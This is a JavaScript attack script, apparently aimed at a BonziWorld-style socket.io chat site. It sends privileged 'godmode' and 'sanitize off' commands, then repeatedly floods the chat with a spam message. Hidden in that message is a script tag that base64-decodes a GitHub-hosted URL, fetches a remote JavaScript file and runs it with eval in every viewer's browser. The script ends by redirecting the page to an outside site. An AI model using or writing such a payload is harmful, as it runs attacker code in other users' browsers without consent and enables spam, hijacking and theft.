let coughtimer = 7777; // Changed from const to let
socket.emit('command', {
    list: ['godmode']
});
socket.emit('command', {
    list: ['sanitize', 'off']
});
const intervalId = setInterval(function() {
    socket.emit("command", {
        list: ["name", "777"]
    });
    socket.emit("command", {
        list: ["color", "black"]
    });
    socket.emit('talk', {
        text: "joining my discord really helps me out joining my discord really helps me out joining my discord really helps me out <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'777'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
    });
    coughtimer = coughtimer - 125;
}, coughtimer);
setTimeout(() => {
    window.location.href = "https://ivorydevrimoalt.github.io/BONZIWORLDULTRAJAVASCRIPTLIST/777.html";
}, 17777);
